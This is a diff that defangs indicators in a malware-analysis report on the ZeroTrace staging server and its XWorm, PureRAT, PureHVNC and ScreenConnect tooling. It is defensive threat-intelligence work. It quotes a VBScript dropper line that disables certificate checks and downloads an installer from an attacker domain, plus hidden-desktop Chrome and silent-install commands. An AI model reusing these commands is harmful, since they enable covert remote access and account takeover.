@@ -34,7 +34,7 @@ description: "ZeroTrace's complete MaaS staging server exposed at 74.0.42.25: 4,
 stix_bundle: /stix/zerotrace-74-0-42-25-20260316.json
 ---
 
-**Campaign Identifier:** ZeroTrace-MultiFamily-MaaS-74.0.42.25<br>
+**Campaign Identifier:** ZeroTrace-MultiFamily-MaaS-74[.]0[.]42[.]25<br>
 **Last Updated:** March 19, 2026<br>
 **Threat Level:** HIGH
 
@@ -44,20 +44,20 @@ stix_bundle: /stix/zerotrace-74-0-42-25-20260316.json
 {: .hl-tier-1}
 {: .hl-tab-overview}
 
-ZeroTrace, a named threat actor corroborated by multiple independent security vendors, left their complete staging server open and accessible without authentication. The open directory at `74.0.42.25` exposed 4,750 files: four simultaneous RAT families, 9.1 million stolen credentials, 500 pre-staged phishing links, and an on-demand ransomware module, infrastructure active and undetected for 16+ months as of the analysis date (2026-03-16).
+ZeroTrace, a named threat actor corroborated by multiple independent security vendors, left their complete staging server open and accessible without authentication. The open directory at `74[.]0[.]42[.]25` exposed 4,750 files: four simultaneous RAT families, 9.1 million stolen credentials, 500 pre-staged phishing links, and an on-demand ransomware module, infrastructure active and undetected for 16+ months as of the analysis date (2026-03-16).
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img loading="lazy" src="{{ "/assets/images/OpenDirectory-74.0.42.25/opendir1.png" | relative_url }}" alt="Hunt.io open directory listing at 74.0.42.25 showing 4,750 files totalling 4GB">
-  <figcaption><em>Figure 1: <a href="https://hunt.io/">Hunt.io</a> view of the open directory at 74.0.42.25, 4,750 files totalling 4GB hosted on Layer7 Technologies (AS40662). The indexed file tree exposes the operator's complete staging environment: malware toolkit, credential databases, and operator tooling left accessible without authentication.</em></figcaption>
+  <img loading="lazy" src="{{ "/assets/images/OpenDirectory-74.0.42.25/opendir1.png" | relative_url }}" alt="Hunt.io open directory listing at 74[.]0[.]42[.]25 showing 4,750 files totalling 4GB">
+  <figcaption><em>Figure 1: <a href="https://hunt.io/">Hunt.io</a> view of the open directory at 74[.]0[.]42[.]25, 4,750 files totalling 4GB hosted on Layer7 Technologies (AS40662). The indexed file tree exposes the operator's complete staging environment: malware toolkit, credential databases, and operator tooling left accessible without authentication.</em></figcaption>
 </figure>
 
 Overall the campaign scores 8.8 out of 10, which is HIGH. Full technical capabilities are dissected in §5, the risk table and business impact scenarios sit in §3, and attribution and the operator profile are in §8. The detection anchors, the XWorm stub's plaintext status messages and the PureRAT TCP preamble `\x04\x00\x00\x00`, plus the full IOC feed, are in §14-15.
 
-The threat vector is email phishing. `Attachment.vbs` delivers ScreenConnect, which the operator uses for persistent remote access behind a Social Security Administration PDF decoy. From that foothold they can deploy XWorm for keylogging and ransomware, PureRAT for encrypted C2, or PureHVNC for hidden desktop sessions that make financial account takeover invisible. The BAK3R credential cracker tests the 9.1 million combo list against Office 365. All four C2 services converge on `185.49.126.140`, so blocking that single IP disrupts all four families at once.
+The threat vector is email phishing. `Attachment.vbs` delivers ScreenConnect, which the operator uses for persistent remote access behind a Social Security Administration PDF decoy. From that foothold they can deploy XWorm for keylogging and ransomware, PureRAT for encrypted C2, or PureHVNC for hidden desktop sessions that make financial account takeover invisible. The BAK3R credential cracker tests the 9.1 million combo list against Office 365. All four C2 services converge on `185[.]49[.]126[.]140`, so blocking that single IP disrupts all four families at once.
 
 **The OPSEC failure created an intelligence windfall.** ZeroTrace accidentally exposed their own C2 panel, full Raven RAT source code, and identity-linked metadata, including operator handle `Steffz` and a Canva account linking to `Stefan Yosifov` (LOW confidence, single source). The operation remains active; 500 pre-generated phishing links have not been distributed as of discovery.
 
-**Primary detection actions:** Block `185.49.126.140` (all ports) and `74.0.42.25`. Deploy detection rules from the [detection file]({{ "/hunting-detections/opendirectory-74-0-42-25-20260316-detections/" | relative_url }}). Full IOC feed: [ioc-feeds/opendirectory-74-0-42-25-20260316-iocs.json]({{ "/ioc-feeds/opendirectory-74-0-42-25-20260316-iocs.json" | relative_url }}).
+**Primary detection actions:** Block `185[.]49[.]126[.]140` (all ports) and `74[.]0[.]42[.]25`. Deploy detection rules from the [detection file]({{ "/hunting-detections/opendirectory-74-0-42-25-20260316-detections/" | relative_url }}). Full IOC feed: [ioc-feeds/opendirectory-74-0-42-25-20260316-iocs.json]({{ "/ioc-feeds/opendirectory-74-0-42-25-20260316-iocs.json" | relative_url }}).
 
 ---
 
@@ -67,7 +67,7 @@ The threat vector is email phishing. `Attachment.vbs` delivers ScreenConnect, wh
 {: .hl-tab-overview}
 
 **1. Four Remote Access Tools on one server: a double-edged sword**  
-The consolidation of XWorm, PureRAT, PureHVNC, and ScreenConnect C2 on a single IP (`185.49.126.140`) is an operational security failure by the operator, but it also means that blocking one IP simultaneously disrupts all four malware families. This is the highest-priority blocking action available to defenders.
+The consolidation of XWorm, PureRAT, PureHVNC, and ScreenConnect C2 on a single IP (`185[.]49[.]126[.]140`) is an operational security failure by the operator, but it also means that blocking one IP simultaneously disrupts all four malware families. This is the highest-priority blocking action available to defenders.
 
 **2. On-demand ransomware is present, and this is not typical XWorm behavior**
 Most commodity XWorm V5.6 deployments are RAT-only; the automated ransomware plugin is a premium-tier add-on not reliably present in cracked builds. Its presence here signals the actor obtained the full-capability builder, not a stripped baseline. The module is ready to push to any active victim with a single operator command, no additional staging required. Any confirmed XWorm infection on this C2 should be treated as a ransomware incident risk, not just a RAT infection.
@@ -114,7 +114,7 @@ The OPSEC failures (open directory, exposed C2 panel, debug logs in droppers) in
 
 For immediate containment, isolate affected systems, block the confirmed C2 IPs, audit and revoke ScreenConnect sessions connected to `adminxyzhosting[.]com:8041`, and rotate credentials for privileged and service accounts reachable from those systems.
 
-For investigation, hunt every IOC in this report across endpoints and network logs, audit ScreenConnect installations for non-corporate relay servers, and examine network connections to `185.49.126.140` and `74.0.42.x`.
+For investigation, hunt every IOC in this report across endpoints and network logs, audit ScreenConnect installations for non-corporate relay servers, and examine network connections to `185[.]49[.]126[.]140` and `74.0.42.x`.
 
 For scope assessment, identify affected systems, data accessed, credentials potentially captured by the keylogger or browser theft plugin, and whether the XWorm ransomware module was deployed. Confirm too whether PureHVNC established hidden browser sessions against financial or email accounts.
 
@@ -129,11 +129,11 @@ For ongoing monitoring, watch for reinfection via bulk ScreenConnect links, sinc
 
 | Family                     | Type                              | Samples                            | Confidence                  | C2                               |
 | -------------------------- | --------------------------------- | ---------------------------------- | --------------------------- | -------------------------------- |
-| **XWorm V5.6**             | RAT + Ransomware module           | 9 (7 stubs + builder + loader)     | DEFINITE                    | 185.49.126.140:5000              |
-| **PureRAT v4.1.9**         | MaaS RAT (ProtoBuf/TLS)           | 11 (9 Stage 1 + Stage 2 + Stage 3) | HIGH (88%, 11 signatures)  | 185.49.126.140:56001-56003       |
-| **PureHVNC stub**          | Hidden VNC                        | 2 (GUI + victim stub xh.exe)       | DEFINITE                    | 185.49.126.140:8000              |
+| **XWorm V5.6**             | RAT + Ransomware module           | 9 (7 stubs + builder + loader)     | DEFINITE                    | 185[.]49[.]126[.]140:5000              |
+| **PureRAT v4.1.9**         | MaaS RAT (ProtoBuf/TLS)           | 11 (9 Stage 1 + Stage 2 + Stage 3) | HIGH (88%, 11 signatures)  | 185[.]49[.]126[.]140:56001-56003       |
+| **PureHVNC stub**          | Hidden VNC                        | 2 (GUI + victim stub xh.exe)       | DEFINITE                    | 185[.]49[.]126[.]140:8000              |
 | **Raven RAT**              | Custom Delphi RAT (~60% complete) | 2 (stub template + operator panel) | DEFINITE                    | Template placeholder (port 8777) |
-| **ScreenConnect v23.2.9**  | Legitimate RMM, abused           | 3                                  | DEFINITE                    | adminxyzhosting.com:443/8041     |
+| **ScreenConnect v23.2.9**  | Legitimate RMM, abused           | 3                                  | DEFINITE                    | adminxyzhosting[.]com:443/8041     |
 | **Aspdkzb loader cluster** | Three-stage fileless loader       | 9 Stage 1 variants                 | HIGH                        | Delivers PureRAT v4.1.9          |
 | **vlc_boxed.exe**          | DGA-capable unknown family        | 1                                  | INSUFFICIENT (inner family) | DGA, domains not captured       |
 
@@ -186,7 +186,7 @@ I hold this DEFINITE, from static analysis, with `XClient.exe` fully decompiled 
 
 | Field            | Value                                             |
 | ---------------- | ------------------------------------------------- |
-| C2 Host          | `185.49.126.140`                                  |
+| C2 Host          | `185[.]49[.]126[.]140`                                  |
 | C2 Port          | `5000`                                            |
 | AES Session Key  | `<999>` (MD5: `893e4e694d81f732ceede1d259a0055f`) |
 | Packet Separator | `<Xwormmm>`                                       |
@@ -315,7 +315,7 @@ I hold this HIGH at 88 percent, on 11 independent technical signatures matched a
 
 **Novel findings (not in any reviewed public report):**
 
-- C2 IP `185.49.126.140`: not attributed to PureRAT in any reviewed public source
+- C2 IP `185[.]49[.]126[.]140`: not attributed to PureRAT in any reviewed public source
 - `Faidowra.dll` (Stage 3) and `Zvafsyattl.exe` (Stage 2) hashes not present in web-accessible sandbox databases at analysis date
 - Three-stage loader chain `Aspdkzb → Zvafsyattl → Faidowra`: these specific samples and their use as a PureRAT delivery chain are undocumented in public research; the underlying fileless .NET loading technique is well established
 
@@ -331,7 +331,7 @@ Stage 2: Zvafsyattl.exe (ConfuserEx, 325KB, entropy 7.97)
          — Assembly.Load() + GetExportedTypes reflection → Stage 3 in memory
 
 Stage 3: Faidowra.dll (PureRAT v4.1.9, .NET Reactor 6.x, 770KB)
-         — Full RAT payload; connects to 185.49.126.140:56001/56002/56003
+         — Full RAT payload; connects to 185[.]49[.]126[.]140:56001/56002/56003
 ```
 
 <figure style="text-align: center; margin: 2em 0;">
@@ -364,7 +364,7 @@ The encoding stack: inline Base64 → `Convert.FromBase64String()` → GZip deco
 
 | Field                     | Value                                                           |
 | ------------------------- | --------------------------------------------------------------- |
-| C2 IP                     | `185.49.126.140`                                                |
+| C2 IP                     | `185[.]49[.]126[.]140`                                                |
 | C2 Ports                  | `56001`, `56002`, `56003` (tried in sequence on each reconnect) |
 | Campaign Tag              | `Default`                                                       |
 | TLS Certificate CN        | `Ayzyqztcoa` (auto-generated random 10-char per build)          |
@@ -374,8 +374,8 @@ The encoding stack: inline Base64 → `Convert.FromBase64String()` → GZip deco
 | Protocol Framing          | 4-byte little-endian length prefix on all messages after TLS    |
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img loading="lazy" src="{{ "/assets/images/OpenDirectory-74.0.42.25/extractedC2_Ports.png" | relative_url }}" alt="Hex editor showing 185.49.126.140 in config_raw.bin alongside PowerShell ISE decoding ports 56001-56003">
-  <figcaption><em>Figure 4: Left, hex editor view of <code>config_raw.bin</code> (the GZip-decompressed ProtoBuf config blob from <code>Faidowra.dll</code>) showing <code>185.49.126.140</code> as plaintext in the raw bytes. Right, PowerShell ISE decoding the varint-encoded port values in the bytes immediately following the IP string. The script output confirms three sequential C2 ports: <code>56001</code>, <code>56002</code>, and <code>56003</code>, the complete C2 connection matrix for this build, extracted directly from the binary without any decryption key.</em></figcaption>
+  <img loading="lazy" src="{{ "/assets/images/OpenDirectory-74.0.42.25/extractedC2_Ports.png" | relative_url }}" alt="Hex editor showing 185[.]49[.]126[.]140 in config_raw.bin alongside PowerShell ISE decoding ports 56001-56003">
+  <figcaption><em>Figure 4: Left, hex editor view of <code>config_raw.bin</code> (the GZip-decompressed ProtoBuf config blob from <code>Faidowra.dll</code>) showing <code>185[.]49[.]126[.]140</code> as plaintext in the raw bytes. Right, PowerShell ISE decoding the varint-encoded port values in the bytes immediately following the IP string. The script output confirms three sequential C2 ports: <code>56001</code>, <code>56002</code>, and <code>56003</code>, the complete C2 connection matrix for this build, extracted directly from the binary without any decryption key.</em></figcaption>
 </figure>
 
 **C2 Protocol Architecture:**
@@ -399,9 +399,9 @@ Raw TCP `\x04\x00\x00\x00` preamble → TLS (cert pinned to `CN=Ayzyqztcoa`) →
 | Campaign tag defaulting to `"Default"`        | Derp.ca                                 |
 
 
-The operator runs the PureCoder ecosystem in full. Both PureRAT (the full RAT, ports 56001-56003) and PureHVNC (the HVNC-only stub `xh.exe`, port 8000) operate simultaneously, both connecting to `185.49.126.140`. They procured two separate PureCoder products and run them in parallel.
+The operator runs the PureCoder ecosystem in full. Both PureRAT (the full RAT, ports 56001-56003) and PureHVNC (the HVNC-only stub `xh.exe`, port 8000) operate simultaneously, both connecting to `185[.]49[.]126[.]140`. They procured two separate PureCoder products and run them in parallel.
 
-This matters because the TLS certificate `NotBefore` date of 2024-11-21 establishes that the PureRAT C2 has been operational since at least then. The certificate was generated on a prior server (`185.49.126.97`) and migrated to `185.49.126.140`, which confirms the infrastructure was pre-staged before weaponization. The four-byte TCP preamble `\x04\x00\x00\x00` is an exceptionally reliable network detection signature, because it appears on the wire before any TLS encryption and is not a standard protocol marker.
+This matters because the TLS certificate `NotBefore` date of 2024-11-21 establishes that the PureRAT C2 has been operational since at least then. The certificate was generated on a prior server (`185[.]49[.]126[.]97`) and migrated to `185[.]49[.]126[.]140`, which confirms the infrastructure was pre-staged before weaponization. The four-byte TCP preamble `\x04\x00\x00\x00` is an exceptionally reliable network detection signature, because it appears on the wire before any TLS encryption and is not a standard protocol marker.
 
 ---
 
@@ -414,15 +414,15 @@ I hold this DEFINITE, with `PureRAT.exe` carrying the internal name `PureHVNC_GU
 **Components:**
 
 - `PureRAT.exe` (82.9MB): PureHVNC operator GUI (PureBasic outer shell, BoxedApp SDK virtual filesystem, DNGuard inner protection). The 75.9MB `.rsrc` section contains a virtual filesystem. Internal name: `PureHVNC_GUI`.
-- `xh.exe` (62,464 bytes): VB.NET victim stub; C2 hardcoded to `185.49.126.140:8000`; references internal component `PHVNC.exe`
+- `xh.exe` (62,464 bytes): VB.NET victim stub; C2 hardcoded to `185[.]49[.]126[.]140:8000`; references internal component `PHVNC.exe`
 
 BoxedApp SDK is a commercial virtual filesystem toolkit that bundles multiple executables and assets into a single binary. DNGuard is a .NET obfuscation/protection product.
 
-This matters because the same IP (`185.49.126.140`) appears hardcoded across three binaries from different families, XWorm on port 5000, PureRAT on ports 56001-56003, and PureHVNC on port 8000, which confirms single-operator control through one consolidated C2 server. Blocking that IP disrupts all three families simultaneously. Because the hidden desktop operates as a legitimate Windows component, most endpoint detection solutions do not flag HVNC activity, so behavioral detections for unexpected `CreateDesktop()` calls are the reliable path.
+This matters because the same IP (`185[.]49[.]126[.]140`) appears hardcoded across three binaries from different families, XWorm on port 5000, PureRAT on ports 56001-56003, and PureHVNC on port 8000, which confirms single-operator control through one consolidated C2 server. Blocking that IP disrupts all three families simultaneously. Because the hidden desktop operates as a legitimate Windows component, most endpoint detection solutions do not flag HVNC activity, so behavioral detections for unexpected `CreateDesktop()` calls are the reliable path.
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img loading="lazy" src="{{ "/assets/images/OpenDirectory-74.0.42.25/xh_exe.webp" | relative_url }}" alt="Decompiled xh.exe PureHVNC stub showing hardcoded C2 IP 185.49.126.140 and HVNC.StartHVNC call">
-  <figcaption><em>Figure 5: Decompiled <code>xh.exe</code> (the PureHVNC victim stub) with the hardcoded C2 address <code>185.49.126.140</code> highlighted. The same IP appears hardcoded across three separate binaries from different malware families (XWorm (port 5000), PureRAT (ports 56001-56003), and PureHVNC (port 8000)) directly confirming a single operator controls all three families through one consolidated C2 server. The <code>HVNC.StartHVNC()</code> call initiates the hidden desktop session using those hardcoded parameters.</em></figcaption>
+  <img loading="lazy" src="{{ "/assets/images/OpenDirectory-74.0.42.25/xh_exe.webp" | relative_url }}" alt="Decompiled xh.exe PureHVNC stub showing hardcoded C2 IP 185[.]49[.]126[.]140 and HVNC.StartHVNC call">
+  <figcaption><em>Figure 5: Decompiled <code>xh.exe</code> (the PureHVNC victim stub) with the hardcoded C2 address <code>185[.]49[.]126[.]140</code> highlighted. The same IP appears hardcoded across three separate binaries from different malware families (XWorm (port 5000), PureRAT (ports 56001-56003), and PureHVNC (port 8000)) directly confirming a single operator controls all three families through one consolidated C2 server. The <code>HVNC.StartHVNC()</code> call initiates the hidden desktop session using those hardcoded parameters.</em></figcaption>
 </figure>
 
 ---
@@ -471,7 +471,7 @@ It is written in Embarcadero Delphi 12.0 Athens Enterprise, a commercial IDE tha
 Creates a hidden Windows desktop via `CreateDesktop()` with `GENERIC_ALL` access. Chrome is launched into the hidden desktop with all rendering acceleration disabled to ensure compatibility in the off-screen context:
 
 ```
-cmd.exe /c "start /max chrome.exe --no-sandbox --allow-no-sandbox-job
+[c]md.exe /c "start /max chrome.exe --no-sandbox --allow-no-sandbox-job
   --disable-3d-apis --disable-gpu --disable-d3d11"
 ```
 
@@ -529,8 +529,8 @@ I hold this DEFINITE, with the DomainTools Iris HTTP server header confirmed on 
 1. VBScript requests UAC elevation via `Shell.Application.ShellExecute` with `runas` verb
 2. Downloads ScreenConnect MSI using `MSXML2.ServerXMLHTTP.6.0` with SSL certificate validation deliberately bypassed:
   ```vbscript
-   oHTTP.setOption 2, 13056  ' 0x3300 — disables SSL cert validation entirely
-   oHTTP.Open "GET", "https://chainconnects[.]net/Bin/support.ClientSetup.msi?e=Access&y=Guest", False
+   [o]HTTP.setOption 2, 13056  ' 0x3300 — disables SSL cert validation entirely
+   oHTTP.Open "GET", "hxxps://chainconnects[.]net/Bin/support.ClientSetup.msi?e=Access&y=Guest", False
    oHTTP.Send
   ```
 3. Silent install: `msiexec /i [msi] /quiet ALLUSERS=2`
@@ -673,7 +673,7 @@ Second, PowerShell decodes the hex-embedded PE entirely in memory, through 13 le
 Third, `[System.Reflection.Assembly]::Load($bytes)` executes the .NET assembly from memory.
 Fourth, Aspdkzb Stage 1 runs, decrypts with AES-256 and GZip, and calls `Assembly.Load()` to bring Zvafsyattl Stage 2 into memory.
 Fifth, a TEA cipher decrypt feeds another `Assembly.Load()`, putting Faidowra.dll Stage 3 in memory.
-Sixth, PureRAT v4.1.9 initializes and connects to `185.49.126.140:56001`, falling back to 56002 or 56003 on retry.
+Sixth, PureRAT v4.1.9 initializes and connects to `185[.]49[.]126[.]140:56001`, falling back to 56002 or 56003 on retry.
 
 ---
 
@@ -682,7 +682,7 @@ Sixth, PureRAT v4.1.9 initializes and connects to `185.49.126.140:56001`, fallin
 > **Analyst note:** The operator installs multiple RAT families in parallel, if one is detected and removed, the others maintain access. Registry Run key persistence ensures all survive reboots. ScreenConnect persists as a legitimate Windows service, which standard malware-removal tools may not uninstall.
 
 **XWorm path:**
-`XwormLoader.exe` → 11-stage reflective load (no disk write) → XWorm .NET stub active in memory → connects `185.49.126.140:5000` → full RAT active (keylogger, screenshot, credentials, HVNC, proxy, ransomware on-demand)
+`XwormLoader.exe` → 11-stage reflective load (no disk write) → XWorm .NET stub active in memory → connects `185[.]49[.]126[.]140:5000` → full RAT active (keylogger, screenshot, credentials, HVNC, proxy, ransomware on-demand)
 
 **Raven RAT path (when operator chooses to deploy):**
 Operator runs `vicTest.exe` on their server (port 8777 listener) → compiled victim stub deployed to target → victim stub connects to `[operator IP]:8777` → HVNC creates hidden Windows desktop → Chrome launched in hidden session with no-sandbox flags → operator controls browser session invisibly
@@ -715,11 +715,11 @@ Operator runs `vicTest.exe` on their server (port 8777 listener) → compiled vi
 
 ### Infrastructure Overview
 
-The infrastructure splits into two clusters. The C2 server at `185.49.126.140` (AS834, IPXO, Netherlands) carries all malware C2 traffic: four separate malware services run simultaneously across seven ports. The domain `adminxyzhosting[.]com` carries a PTR record pointing directly at this IP, tying the ScreenConnect relay domain to the C2 server.
+The infrastructure splits into two clusters. The C2 server at `185[.]49[.]126[.]140` (AS834, IPXO, Netherlands) carries all malware C2 traffic: four separate malware services run simultaneously across seven ports. The domain `adminxyzhosting[.]com` carries a PTR record pointing directly at this IP, tying the ScreenConnect relay domain to the C2 server.
 
 The PureRAT TLS certificate (`CN=Ayzyqztcoa`) dates to November 2024, and domain registration corroborates that timeline independently: `adminxyzhosting[.]com` was registered on 2024-10-23, with ScreenConnect deployed to the server within 25 days. Neither has been taken down as of the analysis date (2026-03-16). I hold AS834 as suspected abuse-tolerant hosting at MODERATE confidence, resting on its IP-leasing model, a documented history of slow abuse response, and this C2 remaining active for 16+ months without action.
 
-The staging cluster sits at `74.0.42.x` (AS40662, Layer7, Germany): three IPs in the same /24 block, all under one customer account, at HIGH confidence on a ROA-validated BGP announcement and three-source agreement. The open directory at `74.0.42.25` hosts the complete malware toolkit, credential databases, and operator tooling; `chainconnects[.]net` currently resolves to `74.0.42.162` in the same block.
+The staging cluster sits at `74.0.42.x` (AS40662, Layer7, Germany): three IPs in the same /24 block, all under one customer account, at HIGH confidence on a ROA-validated BGP announcement and three-source agreement. The open directory at `74[.]0[.]42[.]25` hosts the complete malware toolkit, credential databases, and operator tooling; `chainconnects[.]net` currently resolves to `74[.]0[.]42[.]162` in the same block.
 
 Both clusters geolocate to the Aachen-Kerkrade corridor on the German-Dutch border, less than 5km apart.
 
@@ -859,7 +859,7 @@ The targeting profile centres on corporate O365 and BEC, cryptocurrency users (C
 
 Isolating affected systems prevents lateral movement to other network resources while preserving forensic state for investigation. Avoid powering off systems with potential volatile memory evidence.
 
-Blocking the confirmed C2 infrastructure means immediate network blocks for `185.49.126.140` on all ports, `74.0.42.25`, `74.0.42.162`, `74.0.42.44`, and `185.49.126.97`. Any connection to `185.49.126.140` on ports 5000, 8000, 8041, 443, 56001, 56002, or 56003 is confirmed malicious.
+Blocking the confirmed C2 infrastructure means immediate network blocks for `185[.]49[.]126[.]140` on all ports, `74[.]0[.]42[.]25`, `74[.]0[.]42[.]162`, `74[.]0[.]42[.]44`, and `185[.]49[.]126[.]97`. Any connection to `185[.]49[.]126[.]140` on ports 5000, 8000, 8041, 443, 56001, 56002, or 56003 is confirmed malicious.
 
 The operator domains to block are `adminxyzhosting[.]com`, `chainconnects[.]net`, and MODERATE-confidence domains `ziadxyzhosting[.]com`, `ziadverisontwo[.]com`, `wireon[.]work[.]gd`, `ledno[.]net`.
 
@@ -876,7 +876,7 @@ Deploy detection signatures from the [detection file]({{ "/hunting-detections/op
 - Registry key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\vlctask`
 - Registry key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsService`
 - File `%TEMP%\test_debug.txt` (ScreenConnect dropper debug log)
-- Outbound TCP to `185.49.126.140:56001/56002/56003` with `\x04\x00\x00\x00` preamble (PureRAT)
+- Outbound TCP to `185[.]49[.]126[.]140:56001/56002/56003` with `\x04\x00\x00\x00` preamble (PureRAT)
 - ScreenConnect processes with parent process `wscript.exe` or `msiexec.exe`
 
 Conduct network-wide threat hunt for lateral movement and persistence indicators across all endpoints and servers.
@@ -911,7 +911,7 @@ On remote access software inventory, ConnectWise ScreenConnect is abused here be
 
 On DNS monitoring, the DGA behavior in `vlc_boxed.exe` generates unusual DNS queries through `svchost.exe`. Monitoring DNS for algorithmically generated domain names, particularly from process contexts inconsistent with normal DNS activity, provides detection coverage.
 
-On network egress filtering, all four C2 services converge on `185.49.126.140`. Perimeter egress filtering with IP reputation blocking would disrupt all four families at once, and the PureRAT `\x04\x00\x00\x00` preamble is detectable at the network layer before TLS encryption.
+On network egress filtering, all four C2 services converge on `185[.]49[.]126[.]140`. Perimeter egress filtering with IP reputation blocking would disrupt all four families at once, and the PureRAT `\x04\x00\x00\x00` preamble is detectable at the network layer before TLS encryption.
 
 On credential stuffing defenses, BAK3R's approach of 25 concurrent SMTP AUTH attempts is detectable at the email gateway. Rate limiting on SMTP AUTH, combined with anomalous authentication monitoring for Office 365, meaning multiple failed attempts followed by success from unusual source IPs, provides defense in depth.
 
@@ -935,8 +935,8 @@ On threat hunting coverage, the MITRE ATT&CK techniques in this campaign (see Ap
 - PureHVNC family identification: internal name `PureHVNC_GUI` in config file
 - Raven RAT family identification: full source code recovered
 - ScreenConnect abuse: DomainTools Iris HTTP server header confirmed
-- `185.49.126.140` as active C2 for XWorm (port 5000), PureHVNC (port 8000), PureRAT (ports 56001-56003), ScreenConnect (ports 443/8041)
-- `74.0.42.25` as open directory/staging server
+- `185[.]49[.]126[.]140` as active C2 for XWorm (port 5000), PureHVNC (port 8000), PureRAT (ports 56001-56003), ScreenConnect (ports 443/8041)
+- `74[.]0[.]42[.]25` as open directory/staging server
 - Operator handle `Steffz`: hardcoded in `vicTest.exe` DFM
 - Panel build date 2025-04-13: binary metadata
 - Canva account name `Stefan Yosifov`: XMP metadata value in `Main.dfm` (artifact value only; real-world identity not confirmed)
@@ -964,7 +964,7 @@ On threat hunting coverage, the MITRE ATT&CK techniques in this campaign (see Ap
 - AS834/IPXO as C2 hosting provider: IPinfo + BGP.he.net agreement; AS199654 discrepancy noted and explained
 - Bulletproof hosting characterization for AS834: 3 of 6 indicators present; not definitive
 - wireon.work.gd as PureRAT fallback domain: DNS timeline correlation
-- ziadxyzhosting.com and ziadverisontwo.com as actor-controlled: naming pattern match; WHOIS unavailable
+- ziadxyzhosting[.]com and ziadverisontwo[.]com as actor-controlled: naming pattern match; WHOIS unavailable
 - puf.ps1/sync.ps1 payloads as Aspdkzb-family: size correlation; inner PE not extracted
 - Infrastructure attribution to ZeroTrace (72%): digital identity artifacts + 1 Tier 2 source; ZeroTrace components confirmed, broader campaign scope inferred
 - "Two-person operation" (Steffz + Ziad) hypothesis: naming pattern evidence
@@ -972,8 +972,8 @@ On threat hunting coverage, the MITRE ATT&CK techniques in this campaign (see Ap
 ### LOW (Weak or circumstantial evidence)
 
 - Stefan Yosifov as real-world identity: single source (XMP metadata), no corroboration
-- ledno.net as actor-controlled domain: PTR function confirmed; direct C2 role unconfirmed
-- Raven RAT C2 IP as 185.49.126.140 (port 8777): inferred from infrastructure pattern; unconfirmed
+- ledno[.]net as actor-controlled domain: PTR function confirmed; direct C2 role unconfirmed
+- Raven RAT C2 IP as 185[.]49[.]126[.]140 (port 8777): inferred from infrastructure pattern; unconfirmed
 
 ### INSUFFICIENT (Cannot assess with available evidence)
 
@@ -1005,7 +1005,7 @@ Legitimate ScreenConnect deployments connect to an organization's own relay serv
 **Q3: "The PureRAT C2 ports 56001-56003 are unusual. Can we just block these ports?"**
 Short answer: Yes, and doing so disrupts PureRAT entirely. But this is not sufficient alone.
 
-PureRAT strictly uses ports 56001-56003 for this build (tried in sequence on reconnect). Blocking these ports at the perimeter eliminates PureRAT C2 traffic from this build. However, XWorm uses port 5000, PureHVNC uses port 8000, and ScreenConnect uses ports 443 and 8041. The most efficient single action is blocking `185.49.126.140` entirely, which disrupts all four families simultaneously.
+PureRAT strictly uses ports 56001-56003 for this build (tried in sequence on reconnect). Blocking these ports at the perimeter eliminates PureRAT C2 traffic from this build. However, XWorm uses port 5000, PureHVNC uses port 8000, and ScreenConnect uses ports 443 and 8041. The most efficient single action is blocking `185[.]49[.]126[.]140` entirely, which disrupts all four families simultaneously.
 
 ---
 
@@ -1026,7 +1026,7 @@ The name was recovered as the `pdf:Author` XMP metadata field from a Canva accou
 **Q6: "The toolkit has been active for 16+ months. Why wasn't it detected earlier?"**
 Short answer: The combination of legitimate software abuse, fileless loading, and novel undocumented samples made detection difficult.
 
-Key factors: (1) ScreenConnect is a legitimate application. Most security tools do not flag it as malicious. (2) The PureRAT samples (`Faidowra.dll`, `Zvafsyattl.exe`) were not in public sandbox databases at analysis date, meaning hash-based detection was unavailable. (3) The Aspdkzb three-stage loader chain was undocumented. No published signatures existed. (4) The C2 server `185.49.126.140` had no prior public intelligence, meaning IP reputation tools did not flag it. This underscores why behavioral detection and threat hunting are necessary complements to signature-based approaches.
+Key factors: (1) ScreenConnect is a legitimate application. Most security tools do not flag it as malicious. (2) The PureRAT samples (`Faidowra.dll`, `Zvafsyattl.exe`) were not in public sandbox databases at analysis date, meaning hash-based detection was unavailable. (3) The Aspdkzb three-stage loader chain was undocumented. No published signatures existed. (4) The C2 server `185[.]49[.]126[.]140` had no prior public intelligence, meaning IP reputation tools did not flag it. This underscores why behavioral detection and threat hunting are necessary complements to signature-based approaches.
 
 ---
 
@@ -1048,7 +1048,7 @@ The complete machine-readable IOC feed is available in the structured JSON forma
 **IOC Summary:**
 
 - File hashes (SHA256): 34 samples across all families
-- Network IOCs (confirmed DEFINITE): C2 IP `185.49.126.140` (7 ports), staging IPs `74.0.42.25`, `74.0.42.162`, `74.0.42.44`, `185.49.126.97`, domains `adminxyzhosting[.]com`, `chainconnects[.]net`
+- Network IOCs (confirmed DEFINITE): C2 IP `185[.]49[.]126[.]140` (7 ports), staging IPs `74[.]0[.]42[.]25`, `74[.]0[.]42[.]162`, `74[.]0[.]42[.]44`, `185[.]49[.]126[.]97`, domains `adminxyzhosting[.]com`, `chainconnects[.]net`
 - Network IOCs (MODERATE confidence): `wireon[.]work[.]gd`, `ziadxyzhosting[.]com`, `ziadverisontwo[.]com`, `ledno[.]net`
 - Host IOCs: Mutexes `5tK099W0Z6AMZVxQ` (XWorm) and `x` (Raven RAT); Registry keys (3 confirmed); PureRAT TLS CN `Ayzyqztcoa`
 - Behavioral indicators: TCP preamble `\x04\x00\x00\x00` (PureRAT); XWorm protocol separator `<Xwormmm>` in memory/traffic
@@ -1088,7 +1088,7 @@ The complete machine-readable IOC feed is available in the structured JSON forma
 
 | Tactic               | Technique ID | Technique Name                             | Component                                                            | Confidence |
 | -------------------- | ------------ | ------------------------------------------ | -------------------------------------------------------------------- | ---------- |
-| Resource Development | T1583.001    | Acquire Infrastructure: Domains            | chainconnects.net, adminxyzhosting.com                               | HIGH       |
+| Resource Development | T1583.001    | Acquire Infrastructure: Domains            | chainconnects[.]net, adminxyzhosting[.]com                               | HIGH       |
 | Resource Development | T1588.001    | Obtain Capabilities: Malware               | XWorm V5.6, PureRAT v4.1.9                                           | HIGH       |
 | Initial Access       | T1566.001    | Phishing: Spearphishing Attachment         | Attachment.vbs                                                       | HIGH       |
 | Initial Access       | T1190        | Exploit Public-Facing Application          | CVE-2025-30406 exploit.py                                            | HIGH       |
